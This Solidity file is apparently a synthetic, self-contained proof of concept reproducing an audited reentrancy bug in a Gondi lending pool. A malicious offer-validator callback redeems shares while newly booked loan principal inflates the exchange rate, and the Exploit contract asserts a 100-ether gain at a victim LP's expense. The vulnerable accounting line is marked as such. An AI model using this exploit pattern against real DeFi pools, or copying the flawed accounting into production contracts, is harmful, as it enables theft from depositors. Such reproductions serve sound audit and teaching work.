// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gondi — validateOffer reentry inflates the pool exchange rate
    (Code4rena 2024-04, H-16, AuditVault 35218).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: Pool.validateOffer books _outstandingValues before MultiSourceLoan
    pulls the principal. The offer validator runs in between, so a callback can
    redeem shares against totalAssets that already includes the new loan while the
    cash is still in the pool. The share price moves from 1.00 to 1.25.
    Audited assignment preserved verbatim below (@> VULN).

    Repo: code-423n4/2024-04-gondi @ b9863d73c08fcdd2337dc80a8b5e0917e18b036c
    Pool.validateOffer (src/lib/pools/Pool.sol), MultiSourceLoan._validateOfferExecution. */

library Terms {
    uint256 internal constant CASH = 1000 ether;
    uint256 internal constant OUTSTANDING = 1000 ether;
    uint256 internal constant ATTACKER_SHARES = 400 ether;
    uint256 internal constant VICTIM_SHARES = 1600 ether;
    uint256 internal constant PRINCIPAL = 500 ether;
    uint256 internal constant APR_BPS = 1000;
    uint256 internal constant PROTOCOL_FEE = 0;
    uint256 internal constant SPOT = 400 ether;
    uint256 internal constant RECEIVED = 500 ether;
    uint256 internal constant EXTRA = 100 ether;
    uint256 internal constant RATE_SPOT = 1 ether;
    uint256 internal constant RATE_INFLATED = 1.25 ether;
    address internal constant VICTIM = 0x000000000000000000000000000000000000bEEF;
}

/// 18-decimal pool asset. No transfer hook, so the redeem cannot reenter through the token.
contract Asset {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IOfferValidator {
    function validateOffer(uint256 principalAmount) external;
}

/// Reduced Pool. totalAssets = idle cash + outstanding loan value. validateOffer is not guarded.
contract Pool {
    uint256 private constant BPS = 10_000;

    struct OutstandingValues {
        uint128 principalAmount;
        uint128 accruedInterest;
        uint128 sumApr;
        uint128 lastTs;
    }

    Asset public asset;
    address public loan;
    bool public isActive = true;
    uint256 public getAvailableToWithdraw;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    OutstandingValues internal _outstandingValues;

    error InsufficientAssetsError();
    error PoolStatusError();

    constructor(Asset _asset) {
        asset = _asset;
    }

    function acceptLoan(address _loan) external {
        require(loan == address(0), "loan");
        loan = _loan;
    }

    function approveSpender(address spender) external {
        asset.approve(spender, type(uint256).max);
    }

    function seed(
        address attacker,
        address victim,
        uint256 cash,
        uint256 outstanding,
        uint256 attackerShares,
        uint256 victimShares
    ) external {
        require(totalSupply == 0, "seeded");
        asset.mint(address(this), cash);
        _outstandingValues.principalAmount = uint128(outstanding);
        _outstandingValues.lastTs = uint128(block.timestamp);
        balanceOf[attacker] = attackerShares;
        balanceOf[victim] = victimShares;
        totalSupply = attackerShares + victimShares;
    }

    function totalAssets() public view returns (uint256) {
        return _getUndeployedAssets() + _getOutstandingValue();
    }

    function exchangeRate() public view returns (uint256) {
        uint256 assetsInPool = totalAssets();
        uint256 supplyNow = totalSupply;
        return assetsInPool * 1e18 / supplyNow;
    }

    function previewRedeem(uint256 shares) public view returns (uint256) {
        uint256 assetsInPool = totalAssets();
        uint256 supplyNow = totalSupply;
        return shares * assetsInPool / supplyNow;
    }

    function outstandingPrincipal() public view returns (uint256) {
        return uint256(_outstandingValues.principalAmount);
    }

    function redeem(uint256 shares, address receiver) external returns (uint256 assetsOut) {
        uint256 owned = balanceOf[msg.sender];
        require(owned >= shares, "shares");
        uint256 assetsInPool = totalAssets();
        uint256 supplyNow = totalSupply;
        assetsOut = shares * assetsInPool / supplyNow;
        require(assetsOut != 0, "ZERO_ASSETS");
        balanceOf[msg.sender] = owned - shares;
        totalSupply = supplyNow - shares;
        asset.transfer(receiver, assetsOut);
    }

    /// Audited Pool.validateOffer. onlyAcceptedCallers is the loan contract.
    function validateOffer(bytes calldata _offer, uint256 _protocolFee) external {
        require(msg.sender == loan, "caller");
        if (!isActive) {
            revert PoolStatusError();
        }
        uint256 currentBalance = asset.balanceOf(address(this)) - getAvailableToWithdraw;
        uint256 undeployedAssets = currentBalance;
        (uint256 principalAmount, uint256 apr) = abi.decode(_offer, (uint256, uint256));
        if (principalAmount > undeployedAssets) {
            revert InsufficientAssetsError();
        }
        /// @dev If the txn doesn't revert, we can assume the loan was executed.
        // viaIR inlines the next call. The booked principal is the executed line in _getNewLoanAccounting.
        _outstandingValues = _getNewLoanAccounting(principalAmount, _netApr(apr, _protocolFee));
        // FIX: make validateOffer a view, or hold a lock until the principal transfer, and reject validators.
    }

    function _getUndeployedAssets() private view returns (uint256) {
        return asset.balanceOf(address(this)) - getAvailableToWithdraw;
    }

    function _getOutstandingValue() private view returns (uint256) {
        uint256 principal = uint256(_outstandingValues.principalAmount);
        uint256 elapsed = block.timestamp - uint256(_outstandingValues.lastTs);
        uint256 aprNow = 0;
        if (principal != 0) {
            aprNow = uint256(_outstandingValues.sumApr) / principal;
        }
        uint256 interest = principal * aprNow * elapsed / (BPS * 365 days);
        return principal + uint256(_outstandingValues.accruedInterest) + interest;
    }

    function _netApr(uint256 _apr, uint256 _protocolFee) private pure returns (uint256) {
        return _apr * (BPS - _protocolFee) / BPS;
    }

    function _getNewLoanAccounting(uint256 _principalAmount, uint256 _apr)
        private
        view
        returns (OutstandingValues memory outstandingValues)
    {
        outstandingValues = _outstandingValues;
        uint256 principal = uint256(outstandingValues.principalAmount);
        uint256 elapsed = block.timestamp - uint256(outstandingValues.lastTs);
        uint256 aprNow = 0;
        if (principal != 0) {
            aprNow = uint256(outstandingValues.sumApr) / principal;
        }
        uint256 interest = principal * aprNow * elapsed / (BPS * 365 days);
        outstandingValues.accruedInterest += uint128(interest);
        outstandingValues.sumApr += uint128(_apr * _principalAmount);
        // @> VULN: principal is added to outstanding before the loan pulls the cash, so the exchange rate rises while the assets are still in the pool.
        outstandingValues.principalAmount += uint128(_principalAmount);
        outstandingValues.lastTs = uint128(block.timestamp);
    }
}

/// Reduced emitLoan. validateOffer, then the validator callback, then the principal pull.
contract MultiSourceLoan {
    Asset public asset;
    Pool public pool;
    address public borrower;
    uint256 public pulled;

    constructor(Asset _asset, Pool _pool) {
        asset = _asset;
        pool = _pool;
        borrower = msg.sender;
    }

    function emitLoan(uint256 principal, uint256 apr, uint256 protocolFee, address validator) external {
        pool.validateOffer(abi.encode(principal, apr), protocolFee);
        IOfferValidator(validator).validateOffer(principal);
        asset.transferFrom(address(pool), borrower, principal);
        pulled = principal;
    }
}

/// Offer validator. During validateOffer it redeems the attacker's shares at the live rate.
contract OfferValidator {
    Pool public pool;
    uint256 public shares;
    uint256 public cashDuring;
    uint256 public rateDuring;
    uint256 public received;

    function arm(Pool _pool, uint256 _shares) external {
        pool = _pool;
        shares = _shares;
    }

    function validateOffer(uint256) external {
        uint256 cashStillThere = pool.asset().balanceOf(address(pool));
        cashDuring = cashStillThere;
        uint256 rateNow = pool.exchangeRate();
        rateDuring = rateNow;
        uint256 payout = pool.redeem(shares, address(this));
        received = payout;
    }
}

contract Exploit {
    Asset public asset; // CREATE nonce 1
    Pool public pool; // CREATE nonce 2
    MultiSourceLoan public loan; // CREATE nonce 3
    OfferValidator public validator; // CREATE nonce 4

    uint256 public spotAssets;
    uint256 public receivedAssets;
    uint256 public extraAssets;
    uint256 public rateBefore;
    uint256 public rateDuring;
    uint256 public cashDuring;
    uint256 public victimClaim;
    uint256 public victimShortfall;

    constructor() {
        asset = new Asset();
        pool = new Pool(asset);
        loan = new MultiSourceLoan(asset, pool);
        validator = new OfferValidator();
    }

    function run() external {
        address attacker = address(validator);
        address victim = Terms.VICTIM;
        pool.acceptLoan(address(loan));
        pool.seed(attacker, victim, Terms.CASH, Terms.OUTSTANDING, Terms.ATTACKER_SHARES, Terms.VICTIM_SHARES);
        pool.approveSpender(address(loan));
        validator.arm(pool, Terms.ATTACKER_SHARES);

        uint256 cashBefore = asset.balanceOf(address(pool));
        uint256 spot = pool.previewRedeem(Terms.ATTACKER_SHARES);
        uint256 rate0 = pool.exchangeRate();
        require(cashBefore == Terms.CASH, "cash before");
        require(spot == Terms.SPOT, "spot before");
        require(rate0 == Terms.RATE_SPOT, "rate before");

        loan.emitLoan(Terms.PRINCIPAL, Terms.APR_BPS, Terms.PROTOCOL_FEE, attacker);

        spotAssets = spot;
        receivedAssets = validator.received();
        extraAssets = receivedAssets - spotAssets;
        rateBefore = rate0;
        rateDuring = validator.rateDuring();
        cashDuring = validator.cashDuring();
        victimClaim = pool.previewRedeem(Terms.VICTIM_SHARES);
        victimShortfall = Terms.VICTIM_SHARES - victimClaim;

        require(cashDuring == Terms.CASH, "cash still in pool at the inflated rate");
        require(rateDuring == Terms.RATE_INFLATED, "rate");
        require(receivedAssets == Terms.RECEIVED, "received");
        require(spotAssets == Terms.SPOT, "spot");
        require(extraAssets == Terms.EXTRA, "extra");
        require(victimShortfall == Terms.EXTRA, "lp loss");
        require(asset.balanceOf(attacker) == Terms.RECEIVED, "attacker balance");
        require(loan.pulled() == Terms.PRINCIPAL, "principal left after the redeem");
        require(pool.outstandingPrincipal() == Terms.OUTSTANDING + Terms.PRINCIPAL, "booked");
    }
}
